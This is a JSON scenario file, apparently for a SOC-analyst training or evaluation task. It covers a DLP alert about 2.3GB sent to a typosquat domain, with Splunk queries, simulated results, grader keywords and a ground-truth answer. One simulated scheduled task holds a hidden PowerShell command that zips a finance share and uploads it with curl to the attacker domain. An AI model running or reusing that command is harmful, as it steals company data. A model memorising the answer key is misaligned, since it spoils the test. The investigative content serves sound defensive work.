@@ -1,0 +1,145 @@
+{
+  "id": "insider_data_staging_exfil",
+  "title": "After-Hours Archive Staging and Exfiltration to a Typosquat Domain",
+  "category": "data_loss",
+  "short_description": "A workstation transferred 2.3GB to a 9-day-old lookalike domain at 2 AM via a scheduled task, while its assigned user was off-site.",
+  "alert": {
+    "rule_name": "DLP - Anomalous Outbound Data Transfer (After Hours)",
+    "time": "2026-06-13T02:14:00Z",
+    "host": "corp-ws-221",
+    "user": "FROTHLY\\jchen",
+    "dest_domain": "files.sharepoint-update-cdn.com",
+    "source": "DLP / Network Traffic Analyzer",
+    "severity": "medium",
+    "description": "Host corp-ws-221 transferred 2.3GB over HTTPS to files.sharepoint-update-cdn.com between 02:00-02:45, roughly 57x this host's daily baseline.",
+    "raw": "06/13/2026 02:14:00 DLP-ALERT host=corp-ws-221 user=FROTHLY\\jchen dest=files.sharepoint-update-cdn.com bytes_out=2469135872 rule=\"Anomalous Outbound Data Transfer\" severity=medium"
+  },
+  "steps": [
+    {
+      "step": 1,
+      "tool": "splunk_search",
+      "title": "Compare last night's outbound traffic for corp-ws-221 against its baseline",
+      "match_any": ["bytes_out", "network", "traffic", "baseline", "corp-ws-221", "outbound", "transfer"],
+      "spl": "search index=network host=\"corp-ws-221\" dest=\"files.sharepoint-update-cdn.com\" earliest=\"2026-06-13T02:00:00\" latest=\"2026-06-13T02:45:00\" | stats sum(bytes_out) as bytes_out_last_night | append [search index=network host=\"corp-ws-221\" earliest=-30d@d latest=now | stats avg(bytes_out) as avg_daily_bytes_out by date_mday | stats avg(avg_daily_bytes_out) as baseline_avg_bytes_out]",
+      "result": {
+        "result_count": 1,
+        "events": [
+          {
+            "host": "corp-ws-221",
+            "dest": "files.sharepoint-update-cdn.com",
+            "dest_port": 443,
+            "bytes_out_last_night": 2469135872,
+            "baseline_avg_bytes_out_per_day": 43200000,
+            "ratio_vs_baseline": "~57x",
+            "window": "2026-06-13T02:00:00Z - 2026-06-13T02:45:00Z"
+          }
+        ]
+      },
+      "indicator_tags": ["large_outbound_transfer"]
+    },
+    {
+      "step": 2,
+      "tool": "splunk_search",
+      "title": "Check domain registration age and allowlist status for files.sharepoint-update-cdn.com",
+      "match_any": ["dns", "domain", "sharepoint-update-cdn", "whois", "threat intel", "registration", "allowlist", "approved"],
+      "spl": "search index=dns query=\"files.sharepoint-update-cdn.com\" | head 1 | lookup whois_lookup.csv domain as query OUTPUT registrar, domain_age_days | lookup approved_saas_domains.csv domain as query OUTPUT is_approved",
+      "result": {
+        "result_count": 1,
+        "events": [
+          {
+            "query": "files.sharepoint-update-cdn.com",
+            "domain_age_days": 9,
+            "registrar": "privacy-protected (NameCheap proxy)",
+            "is_approved": false,
+            "lexical_similarity_to": "sharepoint.com",
+            "similarity_score": 0.91,
+            "note": "Domain is a 9-day-old, unapproved, near-duplicate of the legitimate 'sharepoint.com' - a classic typosquat pattern."
+          }
+        ]
+      },
+      "indicator_tags": ["typosquat_domain", "newly_registered_domain"]
+    },
+    {
+      "step": 3,
+      "tool": "splunk_search",
+      "title": "Search process activity on corp-ws-221 immediately before the transfer",
+      "match_any": ["7z", "archive", "process", "zip", "finance", "fileserver", "before transfer"],
+      "spl": "search index=endpoint host=\"corp-ws-221\" earliest=\"2026-06-13T01:50:00\" latest=\"2026-06-13T02:00:00\" Image=\"*7z.exe\" | table _time, host, User, Image, CommandLine",
+      "result": {
+        "result_count": 1,
+        "events": [
+          {
+            "_time": "2026-06-13T01:58:03Z",
+            "host": "corp-ws-221",
+            "User": "FROTHLY\\jchen",
+            "Image": "C:\\Program Files\\7-Zip\\7z.exe",
+            "CommandLine": "7z.exe a -mx5 C:\\Users\\jchen\\AppData\\Local\\Temp\\Finance_Q3_Reports.zip \\\\fileserver\\Finance\\*",
+            "archive_size_bytes": 2480123904,
+            "note": "Archive size (~2.31GB) matches the 2.3GB transferred to files.sharepoint-update-cdn.com two minutes later."
+          }
+        ]
+      },
+      "indicator_tags": ["after_hours_archive_creation", "sensitive_data_staging"]
+    },
+    {
+      "step": 4,
+      "tool": "get_identity_context",
+      "title": "Check jchen's badge and VPN activity overnight",
+      "match_any": ["jchen", "badge", "identity", "user context", "physical access", "vpn", "identity context"],
+      "result": {
+        "user": "FROTHLY\\jchen",
+        "title": "Senior Financial Analyst",
+        "department": "Finance",
+        "badge_log_last_event": "Badged OUT of HQ at 2026-06-12T18:32:00Z (prior evening)",
+        "vpn_sessions_overnight": "none",
+        "notes": "corp-ws-221 remained associated with the corporate LAN DHCP scope all night (no VPN/remote session was established), yet the session was active under jchen's account at 02:00 - jchen was physically off-site and not connected remotely at the time of the activity."
+      },
+      "indicator_tags": ["badge_absent_anomaly"]
+    },
+    {
+      "step": 5,
+      "tool": "splunk_search",
+      "title": "Search for scheduled task / persistence artifacts on corp-ws-221",
+      "match_any": ["scheduled task", "schtasks", "persistence", "onedrive sync helper", "task scheduler", "4698"],
+      "spl": "search index=endpoint host=\"corp-ws-221\" EventCode=4698 earliest=-14d | table _time, host, Account_Name, TaskName, TaskContent",
+      "result": {
+        "result_count": 1,
+        "events": [
+          {
+            "_time": "2026-06-08T22:13:47Z",
+            "host": "corp-ws-221",
+            "Account_Name": "FROTHLY\\jchen",
+            "TaskName": "\\OneDrive Sync Helper",
+            "trigger": "Daily at 02:00 local time",
+            "action": "powershell.exe -nop -w hidden -c \"7z a $env:TEMP\\Finance_Q3_Reports.zip \\\\fileserver\\Finance\\* ; curl.exe -s -F file=@$env:TEMP\\Finance_Q3_Reports.zip https://files.sharepoint-update-cdn.com/upload\"",
+            "note": "Task was created 5 days ago (4 days after the lookalike domain was registered) and runs as jchen, but jchen has no recollection of creating it - likely planted via a compromised session or malicious script."
+          }
+        ]
+      },
+      "indicator_tags": ["scheduled_task_persistence"]
+    }
+  ],
+  "ground_truth": {
+    "verdict": "true_positive",
+    "severity": "critical",
+    "confidence": 0.89,
+    "narrative": "A scheduled task named 'OneDrive Sync Helper', planted on corp-ws-221 five days ago (four days after the attacker registered the typosquat domain files.sharepoint-update-cdn.com), fires nightly at 02:00, archives the entire \\\\fileserver\\Finance\\ share, and uploads it to that domain. Last night it ran as designed: a 2.31GB archive was created at 01:58 and 2.3GB was exfiltrated to the lookalike domain over the next 45 minutes. The account of record, jchen, was physically off-site (badged out at 18:32 the prior evening) with no VPN session active, meaning the task executed autonomously under a dormant session rather than via direct user action. This points to a compromised endpoint/credential being used as a foothold for sustained, automated exfiltration of sensitive Finance data, rather than a one-off insider action - though both the technical compromise and a potential insider angle should be investigated in parallel.",
+    "mitre_indicator_tags": [
+      "large_outbound_transfer",
+      "typosquat_domain",
+      "newly_registered_domain",
+      "after_hours_archive_creation",
+      "sensitive_data_staging",
+      "badge_absent_anomaly",
+      "scheduled_task_persistence"
+    ],
+    "recommended_actions": [
+      "Isolate corp-ws-221 from the network and capture a forensic image before remediation.",
+      "Disable and extract the 'OneDrive Sync Helper' scheduled task for analysis, then hunt for the same task name/pattern fleet-wide.",
+      "Block files.sharepoint-update-cdn.com at DNS, proxy, and firewall, and submit it to threat intel as a confirmed exfil C2.",
+      "Force-reset jchen's credentials and review all activity on this account for the last 14 days across all hosts.",
+      "Engage the insider-threat playbook (Legal/HR) in parallel with the technical response, given sensitive Finance data was staged and exfiltrated.",
+      "Audit \\\\fileserver\\Finance\\ access logs for any other host exhibiting the same archive-then-upload pattern."
+    ]
+  }
+}
